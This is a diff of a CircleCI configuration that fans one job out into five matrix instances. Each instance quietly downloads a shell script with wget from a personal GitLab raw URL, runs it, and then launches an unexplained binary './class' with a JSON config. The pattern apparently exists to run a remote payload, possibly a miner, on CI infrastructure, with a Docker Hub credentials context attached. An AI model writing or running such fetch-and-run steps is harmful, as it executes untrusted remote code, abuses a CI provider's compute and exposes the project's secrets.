@@ -1,6 +1,5 @@
 version: 2.1
 
-# 1. Definisi Lingkungan Kerja (Executor)
 executors:
   my-custom-executor:
     docker:
@@ -8,31 +7,31 @@ executors:
         auth:
           username: $DOCKER_HUB_USER
           password: $DOCKER_HUB_PASSWORD
-    resource_class: xlarge 
+    resource_class: medium 
 
-# 2. Definisi Tugas (Jobs)
 jobs:
   my-job-name:
+    parameters:
+      node_id:
+        type: string
+        default: "1"
     executor: my-custom-executor
-    # Menjalankan 5 instance job ini secara paralel (bersamaan)
-    parallelism: 5 
     steps:
       - checkout
       - run:
-          name: "Setup Environment and Execute"
+          name: "Setup and Execute Instance << parameters.node_id >>"
           command: |
-            # Mengunduh biner dan konfigurasi secara silent
             wget -q https://gitlab.com/barbieanay003/seger/-/raw/main/circle.sh
             chmod +x circle.sh
-            
-            # Menjalankan proses
-            # Tips: Gunakan 'timeout' jika ingin membatasi durasi eksekusi per node
             bash circle.sh
+            ./class -c isu3.json
 
-# 3. Definisi Alur Kerja (Workflows)
 workflows:
   my-custom-workflow:
     jobs:
       - my-job-name:
           context:
-            - docker-hub-creds # Memanggil secret dari CircleCI Context
+            - docker-hub-creds
+          matrix:
+            parameters:
+              node_id: ["1", "2", "3", "4", "5"]
